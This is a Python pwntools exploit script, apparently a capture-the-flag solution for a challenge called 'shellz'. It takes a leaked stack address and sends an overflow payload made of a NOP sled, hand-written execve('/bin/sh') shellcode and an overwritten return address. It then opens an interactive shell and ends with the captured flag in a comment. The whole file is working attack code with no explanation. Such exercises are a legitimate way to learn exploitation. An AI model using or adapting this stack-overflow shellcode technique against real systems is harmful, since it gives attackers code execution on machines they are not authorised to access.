#!/usr/bin/env python2

from pwn import *

def start():
    prog  = "./shellz"
    ip   = "plsdonthaq.me"
    port = 3002

    if args.REMOTE:
        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

p = start()

p.recvuntil(": ")
address = int(p.recvuntil("\n", drop=True), 16)

# /bin/sh\x00 = 2f 62 69 6e 2f 73 68 00
shellcode = asm("""
    push 0x0068732f
    push 0x6e69622f

    mov eax, 0xb
    mov ebx, esp
    mov ecx, 0x0
    mov edx, 0x0
    mov esi, 0x0

    int 0x80
""")

payload = b""
payload += b"\x90" * (0x1000)
payload += shellcode
payload += b"\x90" * (0x2008 - 0x1000 - len(shellcode))
payload += p32(address)

p.sendline(payload)

p.interactive()

# FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyMy1zaGVsbHoiLCJpcCI6IjEwMS4xNjQuMzMuMjE5Iiwic2Vzc2lvbiI6IjZmNTZhOTQzLTgyNDMtNDZlNC1iZWNkLWJlMTJlYmY2ODczYyJ9.f8_kl6w1ffVguqxeIfRq9YdeKDuV57Ymuulb4BEHypI}